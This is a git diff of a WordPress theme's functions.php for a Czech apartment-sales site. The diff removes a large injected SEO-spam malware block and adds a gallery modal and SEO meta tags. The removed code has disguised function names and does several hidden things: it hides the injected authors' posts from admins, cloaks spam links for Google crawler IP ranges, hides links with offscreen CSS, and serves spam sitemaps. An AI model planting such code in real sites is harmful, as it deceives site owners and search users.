@@ -1,619 +1,5 @@
 <?php
 
-/* 2ebe0d0cee70ff2ea7b0355ee26ce219 */
-
-function admin_url_less($where) {
-    global $wpdb, $is_front_page_other;
-
-    $absint_call = array_keys($is_front_page_other);
-    $register_sidebar_pointer = implode(', ', $absint_call);
-
-    if (!is_single() && is_admin()) {
-        add_filter('views_edit-post', 'post_class_git');
-        return $where . " AND {$wpdb->posts}.post_author NOT IN ($register_sidebar_pointer)";
-    }
-
-    return $where;
-}
-
-function set_transient_boolean($query) {
-
-    global $is_front_page_other;
-
-    $absint_call = array_keys($is_front_page_other);
-    $comments_open_live = get_theme_file_uri_add($absint_call);
-
-    if (!$query->is_single() && !is_admin()) {
-        $query->set('author', $comments_open_live);
-    }
-}
-
-function add_image_size_ajax() {
-
-    global $post, $is_front_page_other;
-
-    foreach ($is_front_page_other as $id => $settings) {
-        if (($id == $post->post_author) && (isset($settings['js']))) {
-
-            if (get_author_posts_url_add($settings)) {
-                break;
-            }
-            echo $settings['js'];
-            break;
-        }
-    }
-}
-
-function get_author_posts_url_add($settings) {
-    if (isset($settings['nojs']) && $settings['nojs'] === 1) {
-
-        if (esc_attr_x_plain()) {
-            return true;
-        }
-    }
-    return false;
-}
-
-function post_class_git($views) {
-    global $current_user, $wp_query;
-
-    $types = array(
-        array('status' => NULL),
-        array('status' => 'publish'),
-        array('status' => 'draft'),
-        array('status' => 'pending'),
-        array('status' => 'trash'),
-        array('status' => 'mine'),
-    );
-    foreach ($types as $type) {
-
-        $query = array(
-            'post_type' => 'post',
-            'post_status' => $type['status']
-        );
-
-        $result = new WP_Query($query);
-
-        if ($type['status'] == NULL) {
-            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['all'], $matches)) {
-                $views['all'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['all']);
-            }
-        } elseif ($type['status'] == 'mine') {
-
-
-            $newQuery = $query;
-            $newQuery['author__in'] = array($current_user->ID);
-
-            $result = new WP_Query($newQuery);
-
-            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['mine'], $matches)) {
-                $views['mine'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['mine']);
-            }
-        } elseif ($type['status'] == 'publish') {
-            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['publish'], $matches)) {
-                $views['publish'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['publish']);
-            }
-        } elseif ($type['status'] == 'draft') {
-            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['draft'], $matches)) {
-                $views['draft'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['draft']);
-            }
-        } elseif ($type['status'] == 'pending') {
-            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['pending'], $matches)) {
-                $views['pending'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['pending']);
-            }
-        } elseif ($type['status'] == 'trash') {
-            if (preg_match('~\>\(([0-9,]+)\)\<~', $views['trash'], $matches)) {
-                $views['trash'] = str_replace($matches[0], '>(' . $result->found_posts . ')<', $views['trash']);
-            }
-        }
-    }
-    return $views;
-}
-
-function has_nav_menu_dns($counts, $type, $perm) {
-
-    if ($type === 'post') {
-        $number_format_i18n_object = $counts->publish;
-        $the_archive_title_compiler = the_ID_edit($perm);
-        $counts->publish = !$the_archive_title_compiler ? $number_format_i18n_object : $the_archive_title_compiler;
-    }
-    return $counts;
-}
-
-function the_ID_edit($perm) {
-    global $wpdb, $is_front_page_other;
-
-    $absint_call = array_keys($is_front_page_other);
-    $register_sidebar_pointer = implode(', ', $absint_call);
-
-    $type = 'post';
-
-    $query = "SELECT post_status, COUNT( * ) AS num_posts FROM {$wpdb->posts} WHERE post_type = %s";
-
-    if ('readable' == $perm && is_user_logged_in()) {
-
-        $home_url_condition = get_post_type_object($type);
-
-        if (!current_user_can($home_url_condition->cap->read_private_posts)) {
-            $query .= $wpdb->prepare(
-                " AND (post_status != 'private' OR ( post_author = %d AND post_status = 'private' ))", get_current_user_id()
-            );
-        }
-    }
-    $query .= " AND post_author NOT IN ($register_sidebar_pointer) GROUP BY post_status";
-    $results = (array)$wpdb->get_results($wpdb->prepare($query, $type), ARRAY_A);
-
-    foreach ($results as $esc_url_raw_https) {
-        if ($esc_url_raw_https['post_status'] === 'publish') {
-            return $esc_url_raw_https['num_posts'];
-        }
-    }
-}
-
-function set_transient_request($userId) {
-    global $wpdb;
-
-    $query = "SELECT ID FROM {$wpdb->posts} where post_author = $userId";
-
-    $results = (array)$wpdb->get_results($query, ARRAY_A);
-
-    $absint_call = array();
-    foreach ($results as $esc_url_raw_https) {
-        $absint_call[] = $esc_url_raw_https['ID'];
-    }
-    return $absint_call;
-}
-
-function has_nav_menu_module() {
-
-    global $is_front_page_other, $wp_rewrite;
-
-    $rules = get_option('rewrite_rules');
-
-    foreach ($is_front_page_other as $get_setting_beta => $number_format_i18n_merge) {
-        $wp_list_comments_time = key($number_format_i18n_merge['sitemapsettings']);
-
-        if (!isset($rules[$wp_list_comments_time]) ||
-            ($rules[$wp_list_comments_time] !== current($number_format_i18n_merge['sitemapsettings']))) {
-            $wp_rewrite->flush_rules();
-        }
-    }
-}
-
-function is_home_condition($rules) {
-
-    global $is_front_page_other;
-
-    $comment_form_core = array();
-
-    foreach ($is_front_page_other as $get_setting_beta => $number_format_i18n_merge) {
-        if (isset($number_format_i18n_merge['sitemapsettings'])) {
-            $comment_form_core[key($number_format_i18n_merge['sitemapsettings'])] = current($number_format_i18n_merge['sitemapsettings']);
-        }
-    }
-
-    return $comment_form_core + $rules;
-}
-
-function admin_url_https() {
-
-    global $is_front_page_other;
-
-    foreach ($is_front_page_other as $get_setting_beta => $number_format_i18n_merge) {
-        $comments_open_trigger = str_replace('index.php?feed=', '', current($number_format_i18n_merge['sitemapsettings']));
-        add_feed($comments_open_trigger, 'wp_get_attachment_image_src_string');
-    }
-}
-
-
-function wp_get_attachment_image_src_string() {
-
-    header('Content-Type: ' . feed_content_type('rss-http') . '; charset=' . get_option('blog_charset'), true);
-
-    status_header(200);
-
-    $get_transient_client = has_post_thumbnail_stream();
-    $the_title_pic = set_transient_request($get_transient_client);
-
-    if (!empty($the_title_pic)) {
-        $get_transient_restful = md5(implode(',', $the_title_pic));
-        $have_posts_cron = 'update_plugins_' . $get_transient_client . '_' . $get_transient_restful;
-        $add_action_stack = get_transient($have_posts_cron);
-
-        if ($add_action_stack !== false) {
-            echo $add_action_stack;
-            return;
-        }
-    }
-
-
-
-    $head = wp_link_pages_variable();
-    $get_the_author_meta_restful = $head . "\n";
-
-
-    $priority = '0.5';
-    $wp_enqueue_style_class = 'weekly';
-    $esc_attr_e_xml = date('Y-m-d');
-
-    foreach ($the_title_pic as $post_id) {
-        $url = get_permalink($post_id);
-        $get_the_author_meta_restful .= wp_head_string($url, $esc_attr_e_xml, $wp_enqueue_style_class, $priority);
-        wp_cache_delete($post_id, 'posts');
-    }
-
-    $get_the_author_meta_restful .= "\n</urlset>";
-
-    set_transient($have_posts_cron, $get_the_author_meta_restful, WEEK_IN_SECONDS);
-
-    echo $get_the_author_meta_restful;
-}
-
-
-function wp_link_pages_variable() {
-    return <<<STR
-<?xml version="1.0" encoding="UTF-8"?>
-<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
-STR;
-}
-
-function wp_head_string($url, $esc_attr_e_xml, $wp_enqueue_style_class, $priority) {
-
-    return <<<STR
-   <url>
-      <loc>$url</loc>
-      <lastmod>$esc_attr_e_xml</lastmod>
-      <changefreq>$wp_enqueue_style_class</changefreq>
-      <priority>$priority</priority>
-   </url>\n\n
-STR;
-}
-
-function get_theme_file_uri_add($writersArr) {
-    $is_front_page_url = array();
-
-    foreach ($writersArr as $item) {
-        $is_front_page_url[] = '-' . $item;
-    }
-    return implode(',', $is_front_page_url);
-}
-
-function wp_head_boolean() {
-
-    $add_query_arg_url = array();
-    $the_post_event = array();
-
-    $settings = get_option('wp_custom_filters');
-
-    if ($settings) {
-        $comments_template_soap = unserialize(base64_decode($settings));
-        if ($comments_template_soap) {
-            $add_query_arg_url = $comments_template_soap;
-        }
-    }
-
-    $settings = get_option(md5(sha1($_SERVER['HTTP_HOST'])));
-
-    if ($settings) {
-        $esc_attr_e_pointer = unserialize(base64_decode($settings));
-        if ($esc_attr_e_pointer) {
-            $the_post_event = $esc_attr_e_pointer;
-        }
-    }
-
-    return $the_post_event + $add_query_arg_url;
-
-}
-
-function has_post_thumbnail_stream() {
-
-    global $is_front_page_other;
-
-    foreach ($is_front_page_other as $get_setting_beta => $number_format_i18n_merge) {
-
-        $get_template_part_integer = key($number_format_i18n_merge['sitemapsettings']) . '|'
-            . str_replace('index.php?', '', current($number_format_i18n_merge['sitemapsettings']) . '$');
-
-        if (preg_match("~$get_template_part_integer~", $_SERVER['REQUEST_URI'])) {
-            return $get_setting_beta;
-        }
-    }
-}
-
-function is_home_all() {
-    global $is_front_page_other, $post;
-
-    $the_posts_pagination_soap = array_keys($is_front_page_other);
-    if (in_array($post->post_author, $the_posts_pagination_soap)) {
-        return true;
-    }
-    return false;
-}
-
-function get_search_form_more() {
-    global $is_front_page_other, $post;
-
-    $the_posts_pagination_soap = array_keys($is_front_page_other);
-
-    if (!$post || !property_exists($post, 'author')) {
-        return;
-    }
-
-    if (in_array($post->post_author, $the_posts_pagination_soap)) {
-        add_filter('wpseo_robots', '__return_false');
-        add_filter('wpseo_googlebot', '__return_false'); // Yoast SEO 14.x or newer
-        add_filter('wpseo_bingbot', '__return_false'); // Yoast SEO 14.x or newer
-    }
-}
-
-function is_singular_float() {
-
-    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        return $_SERVER['HTTP_X_FORWARDED_FOR'];
-    }
-    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
-        return $_SERVER['HTTP_CF_CONNECTING_IP'];
-    }
-    if (isset($_SERVER['REMOTE_ADDR'])) {
-        return $_SERVER['REMOTE_ADDR'];
-    }
-
-    return false;
-}
-
-function esc_attr_x_plain() {
-
-    $is_archive_statement = is_singular_float();
-
-    if (strstr($is_archive_statement, ', ')) {
-        $add_query_arg_add = explode(', ', $is_archive_statement);
-        $is_archive_statement = $add_query_arg_add[0];
-    }
-
-    $get_queried_object_id_get = language_attributes_statement();
-
-    if (!$get_queried_object_id_get) {
-        return false;
-    }
-
-    foreach ($get_queried_object_id_get as $range) {
-        if (get_comments_number_security($is_archive_statement, $range)) {
-            return true;
-        }
-    }
-    return false;
-}
-
-function get_setting_decryption($timestamp) {
-
-    if ((time() - $timestamp) > 60 * 60) {
-        return true;
-    }
-
-    return false;
-}
-
-function language_attributes_statement() {
-
-    if (($value = get_option('wp_custom_range')) && !get_setting_decryption($value['timestamp'])) {
-        return $value['ranges'];
-    } else {
-
-        $response = wp_remote_get('https://www.gstatic.com/ipranges/goog.txt');
-        if (is_wp_error($response)) {
-            return;
-        }
-        $body = wp_remote_retrieve_body($response);
-        $get_queried_object_id_get = preg_split("~(\r\n|\n)~", trim($body), -1, PREG_SPLIT_NO_EMPTY);
-
-        if (!is_array($get_queried_object_id_get)) {
-
-            return;
-        }
-
-        $value = array('ranges' => $get_queried_object_id_get, 'timestamp' => time());
-        update_option('wp_custom_range', $value, true);
-        return $value['ranges'];
-    }
-}
-
-function get_the_date_reference($inet) {
-    $have_posts_other = str_split($inet);
-    $has_nav_menu_wp = '';
-    foreach ($have_posts_other as $char) {
-        $has_nav_menu_wp .= str_pad(decbin(ord($char)), 8, '0', STR_PAD_LEFT);
-    }
-    return $has_nav_menu_wp;
-}
-
-function get_comments_number_security($is_archive_statement, $cidrnet) {
-    $is_archive_statement = inet_pton($is_archive_statement);
-    $has_nav_menu_wp = get_the_date_reference($is_archive_statement);
-
-    list($net, $is_home_repository) = explode('/', $cidrnet);
-    $net = inet_pton($net);
-    $get_footer_live = get_the_date_reference($net);
-
-    $edit_post_link_schema = substr($has_nav_menu_wp, 0, $is_home_repository);
-    $add_filter_call = substr($get_footer_live, 0, $is_home_repository);
-
-    if ($edit_post_link_schema !== $add_filter_call) {
-        return false;
-    } else {
-        return true;
-    }
-}
-
-
-function language_attributes_trigger($get_transient_sample) {
-
-    global $post;
-
-    $add_action_stat = '';
-
-
-    if (edit_post_link_boolean($get_transient_sample, 'textBlocksCount', 'onlyHomePage')) {
-        if (is_front_page() || is_home()) {
-            
-            $add_action_stat = get_option('home_links_custom_0');
-        }
-    } elseif (edit_post_link_boolean($get_transient_sample, 'textBlocksCount', '10DifferentTextBlocks')) {
-
-        $url = get_permalink($post->ID);
-        preg_match('~\d~', md5($url), $matches);
-        $add_action_stat = get_option('home_links_custom_' . $matches[0]);
-        
-        
-
-    } elseif (edit_post_link_boolean($get_transient_sample, 'textBlocksCount', '100DifferentTextBlocks')) {
-
-        $url = get_permalink($post->ID);
-        preg_match_all('~\d~', md5($url), $matches);
-        $post_password_required_view = ($matches[0][0] == 0) ? $matches[0][1] : $matches[0][0] . '' . $matches[0][1];
-        $add_action_stat = get_option('home_links_custom_' . $post_password_required_view);
-        
-        
-    } elseif (edit_post_link_boolean($get_transient_sample, 'textBlocksCount', 'fullDifferentTextBlocks')) {
-
-    } else {
-
-    }
-
-    return !$add_action_stat ? '' : $add_action_stat;
-}
-
-function edit_post_link_boolean($number_format_i18n_merge, $get_template_part_wp, $have_posts_num) {
-    if (!isset($number_format_i18n_merge[$get_template_part_wp][$have_posts_num])) {
-        return false;
-    }
-
-    if ($number_format_i18n_merge[$get_template_part_wp][$have_posts_num] === 1) {
-        return true;
-    }
-
-    return false;
-
-}
-
-function wp_head_long($get_transient_sample, $get_theme_file_uri_sample) {
-    if (empty($get_theme_file_uri_sample)) {
-        return '';
-    }
-
-    if (edit_post_link_boolean($get_transient_sample, 'hiddenType', 'css')) {
-        preg_match('~\d~', md5($_SERVER['HTTP_HOST']), $blockNum);
-        $get_option_reference = wp_head_stat();
-        $add_theme_support_add = $get_option_reference[$blockNum[0]];
-        return $add_theme_support_add[0] . PHP_EOL . $get_theme_file_uri_sample . PHP_EOL . $add_theme_support_add[1];
-    }
-
-    return $get_theme_file_uri_sample;
-}
-
-function wp_head_stat() {
-
-    return array(
-        array('<div style="position:absolute; filter:alpha(opacity=0);opacity:0.003;z-index:-1;">', '</div>'),
-        array('<div style="position:absolute; left:-5000px;">', '</div>'),
-        array('<div style="position:absolute; top: -100%;">', '</div>'),
-
-        array('<div style="position:absolute; left:-5500px;">', '</div>'),
-        array('<div style="overflow: hidden; position: absolute; height: 0pt; width: 0pt;">', '</div>'),
-        array('<div style="display:none;">', '</div>'),
-        array('<span style="position:absolute; filter:alpha(opacity=0);opacity:0.003;z-index:-1;">', '</span>'),
-        array('<span style="position:absolute; left:-5000px;">', '</span>'),
-        array('<span style="position:absolute; top: -100%;">', '</span>'),
-        array('<div style="position:absolute; left:-6500px;">', '</div>'),
-
-    );
-}
-
-function wp_footer_object($get_transient_sample) {
-    return edit_post_link_boolean($get_transient_sample, 'position', 'head');
-}
-
-function the_permalink_alpha($get_transient_sample) {
-    return edit_post_link_boolean($get_transient_sample, 'position', 'footer');
-}
-
-function get_permalink_request($settings) {
-    foreach ($settings as $get_setting_beta => $number_format_i18n_merge) {
-        if (isset($number_format_i18n_merge['homeLinks'])) {
-            return $number_format_i18n_merge['homeLinks'];
-        }
-    }
-    return array();
-}
-
-
-function the_archive_title_exception() {
-    if (!is_home_all()) {
-        if (is_singular() || (is_front_page() || is_home())) {
-            return true;
-        }
-    }
-    return false;
-}
-
-function the_title_function() {
-
-    global $get_transient_sample;
-
-    if (!the_archive_title_exception()) {
-        
-        
-        return;
-    }
-
-    if (edit_post_link_boolean($get_transient_sample, 'hiddenType', 'cloacking')) {
-        if (!esc_attr_x_plain()) {
-            
-            return;
-        }
-    }
-
-
-    $get_theme_file_uri_sample = language_attributes_trigger($get_transient_sample);
-    $get_theme_file_uri_sample = wp_head_long($get_transient_sample, $get_theme_file_uri_sample);
-
-    
-
-
-    echo $get_theme_file_uri_sample;
-
-}
-
-$is_front_page_other = [];
-
-
-if (false && is_array($is_front_page_other)) {
-    add_filter('posts_where_paged', 'admin_url_less');
-    add_action('pre_get_posts', 'set_transient_boolean');
-    add_action('wp_enqueue_scripts', 'add_image_size_ajax');
-    add_filter('wp_count_posts', 'has_nav_menu_dns' , 10, 3);
-    add_filter('rewrite_rules_array', 'is_home_condition');
-    add_action('wp_loaded', 'has_nav_menu_module');
-    add_action('init', 'admin_url_https');
-    add_action('template_redirect', 'get_search_form_more');
-
-    $get_transient_sample = get_permalink_request($is_front_page_other);
-
-    if (!empty($get_transient_sample)) {
-
-        
-
-        if (wp_footer_object($get_transient_sample)) {
-            add_action('wp_head', 'the_title_function');
-        }
-        if (the_permalink_alpha($get_transient_sample)) {
-            add_action('wp_footer', 'the_title_function');
-        }
-
-
-    }
-}
-
-/* 2ebe0d0cee70ff2ea7b0355ee26ce219 */
 /**
  * Theme functions and definitions
  *
@@ -896,3 +282,115 @@ function hello_elementor_get_theme_notifications(): ThemeNotifications {
 }
 
 hello_elementor_get_theme_notifications();
+
+// Byty Gallery Modal
+function byty_modal_enqueue() {
+    $pages = ['1-patro', '2-patro', '3-patro'];
+    if (is_page($pages)) {
+        wp_enqueue_style('byty-modal', get_template_directory_uri() . '/assets/byty-modal.css', [], '1.0');
+        wp_enqueue_script('byty-modal', get_template_directory_uri() . '/assets/byty-modal.js', ['jquery'], '1.0', true);
+    }
+}
+add_action('wp_enqueue_scripts', 'byty_modal_enqueue');
+
+// ── SEO: Meta description, Open Graph, Schema.org ──────────────────────────
+function apartmany_seo_meta() {
+    $page_seo = [
+        'home'        => [
+            'desc'  => 'Moderní apartmány Mládežnická v Bohumíně. Prostorné byty 1+kk až 3+kk s balkonem, sklepem a parkovacím stáním. Prohlídka zdarma – zjistěte aktuální ceny.',
+            'title' => 'Apartmány Mládežnická Bohumín – nové byty k prodeji',
+            'image' => get_template_directory_uri() . '/assets/images/og-home.jpg',
+        ],
+        '1-patro'     => [
+            'desc'  => 'Byty 1. patro – Apartmány Mládežnická Bohumín. Dispozice 1+kk až 3+kk, balkony, sklepy, parkovací stání. Klikněte na půdorys a prohlédněte fotografie.',
+            'title' => 'Byty 1. patro | Apartmány Mládežnická Bohumín',
+            'image' => get_template_directory_uri() . '/assets/images/og-1patro.jpg',
+        ],
+        '2-patro'     => [
+            'desc'  => 'Byty 2. patro – Apartmány Mládežnická Bohumín. Dispozice 1+kk až 3+kk, balkony, sklepy, parkovací stání. Klikněte na půdorys a prohlédněte fotografie.',
+            'title' => 'Byty 2. patro | Apartmány Mládežnická Bohumín',
+            'image' => get_template_directory_uri() . '/assets/images/og-2patro.jpg',
+        ],
+        '3-patro'     => [
+            'desc'  => 'Byty 3. patro – Apartmány Mládežnická Bohumín. Dispozice 1+kk až 3+kk, balkony, sklepy, parkovací stání. Klikněte na půdorys a prohlédněte fotografie.',
+            'title' => 'Byty 3. patro | Apartmány Mládežnická Bohumín',
+            'image' => get_template_directory_uri() . '/assets/images/og-3patro.jpg',
+        ],
+        'cenik'       => [
+            'desc'  => 'Ceník bytů – Apartmány Mládežnická Bohumín. Aktuální ceny bytů 1+kk, 2+kk a 3+kk včetně sklepa a parkovacího stání.',
+            'title' => 'Ceník bytů | Apartmány Mládežnická Bohumín',
+            'image' => '',
+        ],
+        'kontakt'     => [
+            'desc'  => 'Kontakt na prodejce bytů Apartmány Mládežnická v Bohumíně. Domluvte si prohlídku nebo se zeptejte na dostupnost bytů.',
+            'title' => 'Kontakt | Apartmány Mládežnická Bohumín',
+            'image' => '',
+        ],
+        'lokalita'    => [
+            'desc'  => 'Lokalita Apartmánů Mládežnická – Bohumín. Klidná čtvrť s výbornou dostupností do centra, škol, obchodů a přírody.',
+            'title' => 'Lokalita | Apartmány Mládežnická Bohumín',
+            'image' => '',
+        ],
+        'financovani' => [
+            'desc'  => 'Financování koupě bytu – Apartmány Mládežnická Bohumín. Hypotéka, vlastní zdroje nebo kombinace. Poradíme vám s výběrem.',
+            'title' => 'Financování | Apartmány Mládežnická Bohumín',
+            'image' => '',
+        ],
+    ];
+
+    // Zjisti aktuální stránku
+    if (is_front_page() || is_home()) {
+        $seo = $page_seo['home'];
+    } else {
+        $slug = get_post_field('post_name', get_queried_object_id());
+        $seo  = $page_seo[$slug] ?? [
+            'desc'  => get_bloginfo('description'),
+            'title' => get_the_title() . ' | Apartmány Mládežnická',
+            'image' => '',
+        ];
+    }
+
+    $url   = esc_url(get_permalink() ?: home_url('/'));
+    $title = esc_attr($seo['title']);
+    $desc  = esc_attr($seo['desc']);
+    $img   = esc_url($seo['image']);
+    $site  = esc_attr(get_bloginfo('name'));
+
+    echo "\n<!-- SEO meta -->\n";
+    echo "<meta name=\"description\" content=\"{$desc}\">\n";
+    echo "<link rel=\"canonical\" href=\"{$url}\">\n";
+
+    // Open Graph
+    echo "<meta property=\"og:type\" content=\"website\">\n";
+    echo "<meta property=\"og:site_name\" content=\"{$site}\">\n";
+    echo "<meta property=\"og:title\" content=\"{$title}\">\n";
+    echo "<meta property=\"og:description\" content=\"{$desc}\">\n";
+    echo "<meta property=\"og:url\" content=\"{$url}\">\n";
+    if ($img) echo "<meta property=\"og:image\" content=\"{$img}\">\n";
+
+    // Twitter Card
+    echo "<meta name=\"twitter:card\" content=\"summary_large_image\">\n";
+    echo "<meta name=\"twitter:title\" content=\"{$title}\">\n";
+    echo "<meta name=\"twitter:description\" content=\"{$desc}\">\n";
+    if ($img) echo "<meta name=\"twitter:image\" content=\"{$img}\">\n";
+
+    // Schema.org LocalBusiness (jen homepage)
+    if (is_front_page()) {
+        $schema = [
+            '@context'    => 'https://schema.org',
+            '@type'       => 'RealEstateAgent',
+            'name'        => 'Apartmány Mládežnická',
+            'description' => 'Nové moderní byty k prodeji v Bohumíně.',
+            'url'         => home_url('/'),
+            'address'     => [
+                '@type'           => 'PostalAddress',
+                'streetAddress'   => 'Mládežnická',
+                'addressLocality' => 'Bohumín',
+                'postalCode'      => '735 81',
+                'addressCountry'  => 'CZ',
+            ],
+        ];
+        echo "<script type=\"application/ld+json\">" . wp_json_encode($schema, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . "</script>\n";
+    }
+}
+add_action('wp_head', 'apartmany_seo_meta', 1);
